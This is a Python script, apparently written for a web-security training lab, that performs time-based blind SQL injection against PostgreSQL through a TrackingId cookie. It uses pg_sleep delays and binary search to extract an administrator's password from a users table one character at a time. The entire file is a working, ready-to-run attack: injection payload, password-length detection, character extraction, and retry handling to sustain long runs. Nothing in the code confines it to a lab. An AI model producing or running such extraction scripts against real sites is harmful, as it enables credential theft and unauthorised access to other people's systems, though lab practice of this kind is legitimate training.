#!/usr/bin/env python3
"""
Time-based blind SQLi (PostgreSQL, pg_sleep) password extractor.

Different oracle from the Oracle/TO_CHAR error-based script you used last time:
instead of checking for HTTP 500, we measure response time. TRUE condition ->
pg_sleep(DELAY) fires -> response takes ~DELAY seconds longer than baseline.
"""
import sys
import time
import requests
import urllib3
import urllib.parse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Fill these with the *current* values from Burp ---
TRACKING_ID_PREFIX = "py5Q3UvMjOYoDB4o"   # everything before the injection point
SESSION_COOKIE     = "QaZXBCycgtRfufGWwPrC7pLvf2YHh5Az"
PASSWORD_LENGTH     = 20                  # set to None to auto-detect via binary search
DELAY               = 3                   # seconds passed to pg_sleep()
THRESHOLD           = DELAY * 0.75        # elapsed time above this counts as TRUE

# Printable ASCII excluding single quote (would break the payload)
CHARSET = ''.join(chr(c) for c in range(33, 127) if chr(c) != "'")

# --- Reused session: keep-alive avoids a fresh TLS handshake per request,
# which is what caused the ReadTimeout/handshake timeout crash last run.
# Retry absorbs an occasional flaky request instead of killing the run. ---
http = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[502, 503, 504])
http.mount("https://", HTTPAdapter(max_retries=retries, pool_maxsize=10))


def send_payload(url: str, condition: str) -> bool:
    """
    Returns True when the condition is TRUE, inferred from response time
    (pg_sleep(DELAY) fired) rather than status code.
    """
    payload = (
        "' || (SELECT CASE WHEN (%s) THEN pg_sleep(%d) ELSE NULL END)--"
        % (condition, DELAY)
    )
    encoded = urllib.parse.quote(payload)
    cookies = {
        "TrackingId": TRACKING_ID_PREFIX + encoded,
        "session": SESSION_COOKIE,
    }
    try:
        start = time.monotonic()
        http.get(url, cookies=cookies, verify=False, timeout=DELAY + 15)
        elapsed = time.monotonic() - start
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Request failed after retries ({e}), treating as False and continuing")
        return False
    return elapsed >= THRESHOLD


def baseline_check(url: str) -> bool:
    true_case  = send_payload(url, "1=1")
    false_case = send_payload(url, "1=2")
    print(f"[+] Baseline → 1=1 delayed: {true_case}, 1=2 delayed: {false_case}")
    return true_case and not false_case


def detect_password_length(url: str, max_len: int = 64) -> int:
    lo, hi = 1, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (
            "LENGTH((SELECT password FROM users WHERE username='administrator')) > %d"
            % mid
        )
        if send_payload(url, cond):
            lo = mid + 1
        else:
            hi = mid
    return lo


def find_char_at_position(url: str, pos: int) -> str:
    lo, hi = 0, len(CHARSET) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        candidate = CHARSET[mid]
        cond = (
            "SUBSTR((SELECT password FROM users WHERE username='administrator'),%d,1) > '%s'"
            % (pos, candidate)
        )
        if send_payload(url, cond):
            lo = mid + 1
        else:
            hi = mid - 1
    if lo >= len(CHARSET):
        return "?"
    result = CHARSET[lo]
    eq_cond = (
        "SUBSTR((SELECT password FROM users WHERE username='administrator'),%d,1) = '%s'"
        % (pos, result)
    )
    if send_payload(url, eq_cond):
        return result
    return "?"


def extract_password(url: str) -> str:
    if not baseline_check(url):
        print("[-] Baseline failed. Update TRACKING_ID_PREFIX / SESSION_COOKIE / URL and try again.")
        sys.exit(1)

    length = PASSWORD_LENGTH
    if length is None:
        print("[+] Detecting password length...")
        length = detect_password_length(url)
        print(f"[+] Password length: {length}")

    password = ""
    for i in range(1, length + 1):
        char = find_char_at_position(url, i)
        password += char
        sys.stdout.write(f"\r[+] Password so far: {password}")
        sys.stdout.flush()
    print()
    return password


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <lab-url>")
        sys.exit(1)
    url = sys.argv[1].rstrip("/")
    print("[+] Starting time-based blind SQLi (PostgreSQL, pg_sleep)...")
    pw = extract_password(url)
    print(f"[+] Administrator password: {pw}")


if __name__ == "__main__":
    main()
